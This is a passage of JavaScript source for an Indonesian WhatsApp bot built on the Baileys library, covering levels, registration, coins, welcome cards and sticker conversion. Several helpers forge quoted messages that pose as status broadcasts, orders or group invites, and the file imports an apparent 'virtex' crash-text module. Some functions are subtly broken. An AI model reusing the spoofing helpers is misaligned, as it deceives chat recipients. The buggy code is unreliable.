  /*Thank You Buat 
* @mhankbarbars
* @NazwaS
* @arugaz
* @adiwajshing
* @mhankbarbars
* @denis
* @Dan para penyedia Rest Api Lainnya
KALAU MAU RECORD MIKIR YA AJG JANGAN NUMPANG NAMA 
*/

/*************START*******************/
const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange,
    MessageOptions,
    WALocationMessage,
    WA_MESSAGE_STUB_TYPES,
    WA_DEFAULT_EPHEMERAL,
    ReconnectMode,
    ProxyAgent,
    waChatKey,
    mentionedJid,
    processTime,
} = require('@adiwajshing/baileys')

/************Load js File**************/
const { color, bgcolor } = require('./lib/color')
const { bahasa } = require('./src/bahasa')
const { negara } = require('./src/kodenegara')
const { virtex } = require('./src/virtex')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const { webp2mp4File} = require('./lib/webp2mp4')
const komiku = require('./lib/scraper.js')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const {
  y2mateV,
  y2mateA
} = require('./lib/ytdl')
const Exif = require('./lib/exif')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const { isTicTacToe, getPosTic } = require('./lib/tictactoe')

/************Load Npm package**********/
const imageToBase64 = require('image-to-base64')
const hx = require('hxz-api')
const gis = require('g-i-s')
const fs = require('fs')
const moment = require('moment-timezone')
const { exec } = require('child_process')
const kagApi = require('@kagchi/kag-api')
const fetch = require('node-fetch')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')
const tik = require('tiktok-scraper-without-watermark')
const base64Img = require('base64-img')
const imgbb = require('imgbb-uploader')
const lolis = require('lolis.life')
const loli = new lolis()
const speed = require('performance-now')
const cd = 4.32e+7
const crypto = require('crypto')
const qrcode = require("qrcode-terminal")
const ytsr = require('ytsr')
const request = require('request')
const ytdl = require('ytdl-core')
const axios = require('axios')
const ig = require('insta-fetcher')
const lolcatjs = require('lolcatjs')
const figlet = require('figlet')
const path = require('path')
const ms = require('parse-ms')
const toMs = require('ms')
const yts = require( 'yt-search')
const util = require('util')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const exif = new Exif();
/*************JSON******************/
const welkom = JSON.parse(fs.readFileSync('./database/json/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/json/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./database/json/simi.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/json/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./database/json/level.json'))
const event = JSON.parse(fs.readFileSync('./database/json/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/json/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/json/uang.json'))
const _registered = JSON.parse(fs.readFileSync('./database/json/registered.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./database/json/tebakgambar.json'))
const antilink = JSON.parse(fs.readFileSync('./database/json/antilink.json'))
const afk = JSON.parse(fs.readFileSync('./database/json/afk.json'))
const antivirtex = JSON.parse(fs.readFileSync('./database/json/antivirtex.json'))
const premium = JSON.parse(fs.readFileSync('./database/json/premium.json'))
const bad = JSON.parse(fs.readFileSync('./database/json/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/json/badword.json'))
const setiker = JSON.parse(fs.readFileSync('./database/json/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./database/json/video.json'))
const audionye = JSON.parse(fs.readFileSync('./database/json/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./database/json/image.json'))
/************OPTIONS*******************/
const option = JSON.parse(fs.readFileSync('./options/option.json'))
const { ind } = require('./options/language')
const { eng } = require('./options/language')
const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const {
    botName,
    ownerName,
    lolhumanKey,
    xteamKey,
    xKey,
    tobzKey,
    zeksKey,
    wmdepan,
    wmbelakang,
    ownerNumbers,
    nomorOwner,
    languages,
    memberLimitss,
    userDefaultLimit
} = option

/************Load Menu*****************/
const { help } = require('./database/menu/help.js')

// Load Vcard Contact
const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
            + 'VERSION:3.0\n' 
            + 'FN:Ahmadzaki\n' // full name
            + 'ORG:Owner Bot;\n' // the organization of the contact
            + `TEL;type=CELL;type=VOICE;waid=${nomorOwner}:+${nomorOwner}\n`// WhatsApp ID + phone number
            + 'END:VCARD'


let tictactoe = [];



blocked = []
limitawal = userDefaultLimit
memberlimit = memberLimitss
cr = '*HLX-BOT VERFIED*'
dfg = '𝗛𝗟𝗫 𝗕𝗢𝗧'
numbernye = '0'
namo = wmdepan
ator = wmbelakang
apixteam = xteamKey
xapi = xKey
apitobz = tobzKey
lolKey = lolhumanKey
apizeks = zeksKey
/*************FUNCTION****************/
        const getLevelingXp = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (userId) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].jid
            }
        }

        const addLevelingXp = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (userId, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].jid === userId) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (userId) => {
            const obj = {jid: userId, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/json/level.json', JSON.stringify(_level))
        }
        const getLimit = (sender) => {
                let position = false
              Object.keys(limit).forEach ((i) => {
                if (limit[position].id === sender) {
                   position = i
                  }
              })
             if (position !== false) {
                return limit[position].limit
            }
        }

        const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/json/registered.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }

        const addATM = (sender) => {
                const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/json/uang.json', JSON.stringify(uang))
        }

        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/json/uang.json', JSON.stringify(uang))
            }
        }

        const checkATMuser = (sender) => {
                let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }

        const bayarLimit = (sender, amount) => {
                let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
            }
        }

        const confirmATM = (sender, amount) => {
                let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/json/uang.json', JSON.stringify(uang))
            }
        }

        const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/json/limit.json', JSON.stringify(_limit))
            }
        }

function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`

}

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const zakinew = fs.readFileSync('./temp/image/zakinew.jpeg')
async function starts() {
	const zaki = new WAConnection()
	zaki.version = [2, 2119, 6]
	zaki.logger.level = 'warn'
	zaki.on('qr', () => {
		console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code above'))
	})

	fs.existsSync('./Nazwa.json') && zaki.loadAuthInfo('./Nazwa.json')
	zaki.on('connecting', () => {
		start('2', 'Connecting...')
	})
	zaki.on('open', () => {
		success('2', '[BOT] BOT is now online!')
	})
	await zaki.connect({timeoutMs: 30*1000})
        fs.writeFileSync('./Nazwa.json', JSON.stringify(zaki.base64EncodedAuthInfo(), null, '\t'))

        console.log('=> Bot succsessfully loaded!')
        lolcatjs.fromString('[DEV] Welcome back Owner! Hope you are doing well-')

	zaki.on('group-participants-update', async (anu) => {

		if (!welkom.includes(anu.jid)) return

		try {
			const mdata = await zaki.groupMetadata(anu.jid)
			console.log(anu)
			if (anu.action == 'add') {
				num = anu.participants[0]
				try {
					ppimg = await zaki.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				try {
                var pp_group = await zaki.getProfilePicture(anu.jid)

            } catch (e) {
                var pp_group = 'https://i.ibb.co/D1jr9sP/4d1ee76b1d98.jpg'
            }
            
        ini_user = zaki.contacts[num].notify || zaki.contacts[num].vname
        ini_user = encodeURI(ini_user)
        
				teks = `Halo @${num.split('@')[0]}\nSelamat datang di group *${mdata.subject}*`
						let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome?nama=${ini_user}&descriminator=${_registered.length}&memcount=${_registered.length}&gcname=${mdata.subject}&gcicon=${pp_group}&pp=${ppimg}&bg=https://i.ibb.co/Sw5SzgM/c5ce68f75328.jpg`)
				zaki.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			} else if (anu.action == 'remove') {
				num = anu.participants[0]
				try {
					ppimg = await zaki.getProfilePicture(`${num.split('@')[0]}@c.us`)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				teks = `Sayonara @${num.split('@')[0]}`
				let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye?nama=${ini_user}&descriminator=${_registered.length}&memcount=${_registered.length}&gcname=${mdata.subject}&gcicon=${pp_group}&pp=${ppimg}&bg=https://i.ibb.co/Sw5SzgM/c5ce68f75328.jpg`)
				zaki.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
			}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})

		zaki.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})

	zaki.on('chat-update', async (mek) => {
		try {
            if (!mek.hasNewMessage) return
            mek = JSON.parse(JSON.stringify(mek)).messages[0]
            if (mek.key.fromMe) return
    mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			global.prefix
			global.blocked
			global.batrei = global.batrei ? global.batrei : []

			zaki.on('CB:action,,battery', json => {

		    const batteryLevelStr = json[2][0][1].value
		    const batterylevel = parseInt(batteryLevelStr)
		    global.batrei.push(batterylevel)
	        })
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const mentionUser = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.mentionedJid || [] : []
			mentionByreply = type == "extendedTextMessage" ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
            mentionUser.push(mentionByreply)
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()

			const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
      const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
      const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
			const date = moment.tz('Asia/Jakarta').format('DD,MM,YY')
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
                        var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			const q = args.join(' ')
			const arg = budy.slice(command.length + 2, budy.length)
      const tescuk = ["0@s.whatsapp.net"]
                     
                        
                        mess = {
                                wait: '𒊹︎︎︎ *Tunggu* _Sebentar_ *_HLXBOT_* *_Sedang Memproses_*...︎︎',
                                ferr: '*_Maaf Kakak Sepertinya Fitur Ini Sedang Erorr_*',
                                succsess: '✔️ Berhasil ✔️',
                                levelon: '❬ ✔ ❭ *leveling telah aktif*',
                                levelnoton: `❬ X ❭  *disable leveling*`,
                                levelnol: '*LEVEL KAKAK MASIH* 0 °-°',
                                error: {
                                	    stick: '[❗] Gagal, terjadi kesalahan saat mengkonversi gambar ke sticker ❌',
                                        Iv: '❌ Link tidak valid ❌',
                                },
                        	only: {
                        	        group: '[❗] Perintah ini hanya bisa di gunakan dalam group! ❌',
                                        ownerG: `[❗] Perintah ini hanya bisa di gunakan oleh owner group! ❌`,
                        	        admin: `[❗] Perintah ini hanya bisa di gunakan oleh admin group! ❌`,
                                        Badmin: `[❗] Perintah ini hanya bisa di gunakan ketika bot menjadi admin! ❌`,
                                     
                     puasa: `[⚠️] Perintah Sedang Di Blokir Karena Puasa Ramadhan`,
                     
                     
                     virtex: `[⚠️] Cie Mau Ngerusuh Ya, Kasian Ga bisa 😂`,
                     
                     premium: `[💎] *Maaf Fitur Ini Khusus User Premium HLXBOT
                    Kalau Ingin Membeli Premium Silahkan Hubungi wa.me/6283873394995* `,
                                     daftarB:  ` *──「 BELUM REGISTER 」──* \nHalo Kak\nKamu belum Register nih, register dulu yuk... \n\nKetik : ${prefix}verify`,
                                }
                        }
                	const apakah = ['Ya','Tidak','Mungkin iya','Mungkin Tidak','Tentu iya','Tentu tidak']
        	        const bisakah = ['Bisa','Tidak Bisa','Mingkin']
		        const kapankah = ['Hari Lagi','Minggu Lagi','Bulan Lagi','Tahun Lagi']
			const botNumber = zaki.user.jid
			const ownerNumber = [ownerNumbers]
			const nomorOwner = [ownerNumbers]
			const isGroup = from.endsWith('@g.us')
			const totalchat = await zaki.chats.all()
      const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = zaki.user.phone
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			const groupMetadata = isGroup ? await zaki.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			
                        const isLevelingOn = isGroup ? _leveling.includes(groupId) : false
                        const NomerOwner = '6283873394995@s.whatsapp.net'
                        const botLangs = languages
                        const isEventon = isGroup ? event.includes(from) : false
                        const isRegister = checkRegisteredUser(sender)
                        const isPrem = premium.includes(sender) 
                        const isAntiLink = isGroup ? antilink.includes(from) : false

                     const isAntivirtex = isGroup ? antivirtex.includes(from) : false
                        pushname = zaki.contacts[sender] != undefined ? zaki.contacts[sender].vname || zaki.contacts[sender].notify : undefined
                        const isBadWord = isGroup ? badword.includes(from) : false
                        
                    	let authorname = zaki.contacts[from] != undefined ? zaki.contacts[from].vname || zaki.contacts[from].notify : undefined	

			if (authorname != undefined) { } else { authorname = groupName }	

			function addMetadata(packname, author) {	
				if (!packname) packname = '@Ahmadzaki'; if (!author) author = 'HLXBOT';	
				author = author.replace(/[^a-zA-Z0-9]/g, '');	
				let name = `${author}_${packname}`
				if (fs.existsSync(`./temp/${name}.exif`)) return `./temp/${name}.exif`
				const json = {	
					"sticker-pack-name": packname,
					"sticker-pack-publisher": author,
				}
				const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
				const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
				let len = JSON.stringify(json).length	
				let last	
				if (len > 256) {	
					len = len - 256	
					bytes.unshift(0x01)	
				} else {	
					bytes.unshift(0x00)	
				}	
				if (len < 16) {	
					last = len.toString(16)	
					last = "0" + len	
				} else {	
					last = len.toString(16)	
				}	
				const buf2 = Buffer.from(last, "hex")	
				const buf3 = Buffer.from(bytes)	
				const buf4 = Buffer.from(JSON.stringify(json))	
				const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
				fs.writeFile(`./temp/${name}.exif`, buffer, (err) => {	
					return `./temp/${name}.exif`	
				})
			}
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				zaki.sendMessage(from, teks, text, {quoted: mek })
			}
			const sendMess = (hehe, teks) => {
				zaki.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? zaki.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : zaki.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
                        const sendImage = (teks) => {
		                zaki.sendMessage(from, teks, image, {quoted:mek})
		        }
		        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker'))

				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					zaki.sendMessage(to, media, sticker, {quoted: mek})
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker'))
					});
					});
				});
			}
		        const costum = (pesan, tipe, target, target2) => {
			        zaki.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
				const sotoy = [
        '🍊 : 🍒 : 🍐',
        '🍒 : 🔔 : 🍊',
        '🍇 : ?? : 🍐',
        '🍊 : 🍋 : 🔔', //ANKER
        '🔔 : 🍒 : 🍐',
        '🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',        
        '🍐 : 🍒 : 🍋',
        '🍐 : 🍒 : 🍐',
        '🍊 : 🍒 : 🍒',
        '🔔 : 🔔 : 🍇',
        '🍌 : ?? : 🔔',
        '🍐 : 🔔 : 🔔',
        '🍊 : 🍋 : 🍒',
        '🍋 : 🍋 : 🍋 Win👑',
        '🔔 : 🔔 : 🍇',
        '🔔 : 🍐 : 🍇', 
        '🔔 : 🍐 : ??',
        '🍌 : 🍌 : 🍌 Win👑'
        ]
        
       const sotoyy= [
        'X : X : X',
        'X : O : X',
        'O : X : X',
        'O : O : X',
        'X : X : O',
        'O : O : O Win 👑',
        'O : X : O',
        'O : O : O Win👑'
        ]
        var Eventon = 'Off'
			if(isEventon) {
			Eventon = 'On'
			}
	  var Leveling = 'Off'
			if(isLevelingOn) {
			Leveling = 'On'
			}
	  var Welkom = 'Off'
			if(isWelkom) {
			Welkom = 'On'
			}
	  var AntiLink = 'Off'
			if(isAntiLink) {
			AntiLink = 'On'
			}
	  var Antivirtex = 'Off'
      if (!isAntivirtex) {
      Antivirtex = 'On'
      }
	  var BadWord = 'Off'
			if(isBadWord) {
			BadWord = 'On'
			}
        const zaki1 = ['1','2','3','4','5','6','7','8','9']
        const zaki2 = ['1','2','3','4','5','6','7','8','9'] 
        const zaki3 = zaki1[Math.floor(Math.random() * (zaki1.length))]
        const zaki4 = zaki2[Math.floor(Math.random() * (zaki2.length))] 
        	const sendKontak = (from, nomor, nama) => {

	        const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'

	        zaki.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact)
            }
            
            const hideTagKontak = async function(from, nomor, nama){
	        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	        let anu = await zaki.groupMetadata(from)
	        let members = anu.participants
	        let ane = []
	        for (let i of members){
		    ane.push(i.jid)
	        }
	        zaki.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
            }
            
			const faketroli = (teks) => {
             zaki.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/tahta.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: cr, sellerJid: '0@s.whatsapp.net'}}}})
                }
                
           const fakeimage = (teks) => {
             zaki.sendMessage(from, teks, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { mimetype: "image/jpeg", "caption": `*Hai ${pushname}*
 Nama : *_BOTHLX_*
 Rate : ★★★★✩`,  "jpegThumbnail": fs.readFileSync('./temp/image/HLXB.jpeg') } } } } )
                }
                
                const fgclink = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": "mememteeeekkeke",
			"groupName": "HLX BOT", 
            "caption": "Halo bang jagoo", 
            'jpegThumbnail': fs.readFileSync('temp/image/HLXB.jpeg')
		}
	}
}
                
		        const sendptt = (teks) => {
		                zaki.sendMessage(from, audio, mp3, {quoted:mek})
		        }
		        
		        const mentiontebak = type == "extendedTextMessage" ? mek .message.extendedTextMessage.contextInfo.mentionedJid || [] : []

            mentiongambar = type == "extendedTextMessage" ? mek .message.extendedTextMessage.contextInfo.participant || "" : ""

            mentiontebak.push(mentiongambar)
            if (tebakgambar.hasOwnProperty(sender.split('@')[0]) && !isCmd) {
                jawaban = tebakgambar[sender.split('@')[0]]
                if (budy.toLowerCase() == jawaban) {
                    reply(`${pushname}, Anda menjawab dengan benar! Selamat >~<`)
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                } else {
                    reply(`${pushname}, Jawaban salah! Silahkan coba lagi >~<`)
                }
            }
		        const fakegroup = (teks) => {
	zaki.sendMessage(from, teks, text, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
					},
					message: {
						conversation: cr
					}
				}
			})
		}
		var prema = 'User Free'
			if (isPrem) {
				prema = 'User Premium💎'
			}
			if (isOwner) {
				prema = 'BOSS'
			}
                        //function rank 
			const levelRole = getLevelingLevel(sender, _level)
   	                var role = 'Trainee'
   	                if (levelRole <= 3) {
   	                        role = 'senior trainee'
   	                } else if (levelRole <= 5) {
   	                        role = 'private'
   	                } else if (levelRole <= 7) {
   	                        role = 'corporal'
   	                } else if (levelRole <= 8) {
   	                        role = 'Sergeant'
   	                } else if (levelRole <= 9) {
   	                        role = 'staff sgt I'
   	                } else if (levelRole <= 10) {
   	                        role = 'staff sgt II'
   	                } else if (levelRole <= 11) {
   	                        role = 'staff sgt II'
   	                } else if (levelRole <= 12) {
   	                        role = 'Sgt 1st class I'
   	                } else if (levelRole <= 13) {
   	                        role = 'Sgt 1st class II'
   	                } else if (levelRole <= 14) {
   	                        role = 'Sgt 1st class III'
   	                } else if (levelRole <= 14) {
   	                        role = 'Ggt 1st class IV'
   	                } else if (levelRole <= 15) {
   	                        role = 'Master sgt I'
   	                } else if (levelRole <= 16) {
   	                        role = 'Master sgt II'
   	                } else if (levelRole <= 17) {
   	                        role = 'Master sgt III'
   	                } else if (levelRole <= 18) {
   	                        role = 'Master sgt IV'
   	                } else if (levelRole <= 19) {
   	                        role = 'Master sgt V'
   	                } else if (levelRole <= 20) {
   	                        role = '2nd Lt I'
   	                } else if (levelRole <= 21) {
   	                        role = '2nd Lt II'
   	                } else if (levelRole <= 22) {
   	                        role = '2nd Lt III'
   	                } else if (levelRole <= 23) {
   	                        role = '2nd Lt IV'
   	                }
   	              const sendStickerFromUrl = async(to, url) => {

                var names = Date.now() / 10000;

                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        zaki.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            
                 const sendMediaURL = async(to, url, text="", mids=[]) =>{

                if(mids.length > 0){

                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    zaki.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
           
	                //function leveling
                        if (isGroup && isLevelingOn) {
                                const currentLevel = getLevelingLevel(sender)
                                const checkId = getLevelingId(sender)
                                try {
                                        if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                                        const amountXp = Math.floor(Math.random() * 10) + 500
